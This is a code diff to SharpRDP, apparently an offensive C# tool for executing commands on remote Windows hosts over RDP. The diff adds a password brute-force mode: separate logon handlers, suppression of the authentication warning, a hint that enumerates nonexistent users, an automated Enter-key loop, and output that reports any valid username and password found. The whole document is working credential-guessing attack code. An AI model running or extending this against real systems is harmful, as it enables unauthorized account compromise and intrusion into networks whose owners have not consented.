@@ -21,9 +21,13 @@ namespace SharpRDP
         private string execwith;
         private string target;
         private string runtype;
+        private string currentPassword;
         private bool isdrive;
         private bool takeover;
         private bool networkauth;
+        private bool bruteforce;
+        private bool stopThread = false;
+        public bool foundPassword;
         private enum LogonErrors : uint
         {
             ARBITRATION_CODE_BUMP_OPTIONS = 0xFFFFFFFB,
@@ -92,7 +96,7 @@ namespace SharpRDP
             SSL_ERR_SMARTCARD_WRONG_PIN = 0x1C07
         }
 
-        public void CreateRdpConnection(string server, string user, string domain, string password, string command, string execw, string runelevated, bool condrive, bool tover, bool nla)
+        public void CreateRdpConnection(string server, string user, string domain, string password, string command, string execw, string runelevated, bool condrive, bool tover, bool nla, bool brute)
         {
             keycode = new Dictionary<String, Code>();
             KeyCodes();
@@ -103,6 +107,9 @@ namespace SharpRDP
             execwith = execw;
             takeover = tover;
             networkauth = nla;
+            bruteforce = brute;
+
+            currentPassword = password;
 
             void ProcessTaskThread()
             {
@@ -148,27 +155,81 @@ namespace SharpRDP
                     }
                     if (true)
                     {
-                        rdpConnection.OnDisconnected += RdpConnectionOnOnDisconnected;
-                        rdpConnection.OnLoginComplete += RdpConnectionOnOnLoginComplete;
-                        rdpConnection.OnLogonError += RdpConnectionOnOnLogonError;
+                        if (bruteforce)
+                        {
+                            rdpConnection.OnDisconnected += RdpConnectionOnOnDisconnectedBrute;
+                            rdpConnection.OnLoginComplete += RdpConnectionOnLoginCompleteBrute;
+                            rdpConnection.OnLogonError += RdpConnectionOnOnLogonErrorBrute;
+                            // Cancel the authentication warning event when it is displayed
+                            rdpConnection.OnAuthenticationWarningDisplayed += RdpConnectionOnOnAuthenticationWarning;
+
+                            
+                        }
+                        else
+                        {
+                            rdpConnection.OnDisconnected += RdpConnectionOnOnDisconnected;
+                            rdpConnection.OnLoginComplete += RdpConnectionOnOnLoginComplete;
+                            rdpConnection.OnLogonError += RdpConnectionOnOnLogonError;
+                        }
                     }
+
                     rdpConnection.Connect();
                     rdpConnection.Enabled = false;
                     rdpConnection.Dock = DockStyle.Fill;
                     Application.Run(form);
+                    
                 };
                 form.Show();
             }
 
-            var rdpClientThread = new Thread(ProcessTaskThread) { IsBackground = true };
-            rdpClientThread.SetApartmentState(ApartmentState.STA);
-            rdpClientThread.Start();
-            while (rdpClientThread.IsAlive)
+            try
             {
-                Task.Delay(500).GetAwaiter().GetResult();
+                var rdpClientThread = new Thread(ProcessTaskThread) { IsBackground = true };
+                rdpClientThread.SetApartmentState(ApartmentState.STA);
+                rdpClientThread.Start();
+
+                if (brute)
+                {
+                    while (!stopThread)
+                    {
+                        Task.Delay(500).GetAwaiter().GetResult();
+                        SendElement("Enter+down");
+                    }
+
+                }
+                else
+                {
+                    while (rdpClientThread.IsAlive)
+                    {
+                        Task.Delay(500).GetAwaiter().GetResult();
+                    }
+                }
             }
+            catch
+            {
+                // do nothing
+            }
+
+            
+
+            
         }
 
+        private void RdpConnectionOnOnAuthenticationWarning(object sender, EventArgs e)
+        {
+            var rdpSession = (AxMsRdpClient9NotSafeForScripting)sender;
+            Console.WriteLine("[-] Authentication warning displayed, user likely doesn't exist.");
+
+        }
+
+        private void RdpConnectionOnOnLogonErrorBrute(object sender, IMsTscAxEvents_OnLogonErrorEvent e)
+        {
+            LogonErrorCode = e.lError;
+            var errorstatus = Enum.GetName(typeof(LogonErrors), (uint)LogonErrorCode);
+            Console.WriteLine("[-] Logon Error           :  {0} - {1}", LogonErrorCode, errorstatus);
+            
+        }
+        
         private void RdpConnectionOnOnLogonError(object sender, IMsTscAxEvents_OnLogonErrorEvent e)
         {
             LogonErrorCode = e.lError;
@@ -194,15 +255,28 @@ namespace SharpRDP
                 Marshal.ReleaseComObject(rdpSession);
                 Marshal.ReleaseComObject(keydata);
             }
+            else if (LogonErrorCode == 0)
+            {
+                Console.WriteLine("[-] Logon Error           :  {0} - {1}", LogonErrorCode, errorstatus);
+            }
             else if (LogonErrorCode != -2)
             {
                 Environment.Exit(0);
             }
         }
 
+        private void RdpConnectionOnLoginCompleteBrute(object sender, EventArgs e)
+        {
+            var rdpSession = (AxMsRdpClient9NotSafeForScripting)sender;
+            Console.WriteLine("\n[+] Valid password found      :  {0}:{1}\n", rdpSession.UserName, currentPassword);
+            foundPassword = true;
+            rdpSession.Disconnect();
+        }
+
         private void RdpConnectionOnOnLoginComplete(object sender, EventArgs e)
         {
             var rdpSession = (AxMsRdpClient9NotSafeForScripting)sender;
+
             Console.WriteLine("[+] Connected to          :  {0}", target);
             Thread.Sleep(1000);
             keydata = (IMsRdpClientNonScriptable)rdpSession.GetOcx();
@@ -242,6 +316,28 @@ namespace SharpRDP
             Thread.Sleep(1000);
             Console.WriteLine("[+] Disconnecting from    :  {0}", target);
             rdpSession.Disconnect();
+        }
+
+        private void RdpConnectionOnOnDisconnectedBrute(object sender, IMsTscAxEvents_OnDisconnectedEvent e)
+        {
+            //var rdpSession = (AxMsRdpClient9NotSafeForScripting)sender;
+
+            //DisconnectCode = e.discReason;
+            //var dire = Enum.GetName(typeof(DisconnectReasons), (uint)DisconnectCode);
+            //Console.WriteLine("[+] Connection closed     :  {0}", target);
+            //Console.WriteLine("[-] Disconnection Reason  :  {0} - {1}", DisconnectCode, dire);
+            //if (e.discReason != 1)
+            //{
+            //    Console.WriteLine("[-] Disconnection Reason  :  {0} - {1}", DisconnectCode, dire);
+            //}
+            //Environment.Exit(0);
+
+            // Signal the rdpClientThread to exit
+            //Console.WriteLine("Setting thread flag");
+            stopThread = true;
+
+            
+
         }
 
         private void RdpConnectionOnOnDisconnected(object sender, IMsTscAxEvents_OnDisconnectedEvent e)
@@ -518,5 +614,7 @@ namespace SharpRDP
             keycode["Ctrl+Shift+down"] = new Code(new[] { false, false }, new[] { 0x1d, 0x2a });
             keycode["Ctrl+Shift+up"] = new Code(new[] { true, true }, new[] { 0x1d, 0x2a });
         }
+
+
     }
 }
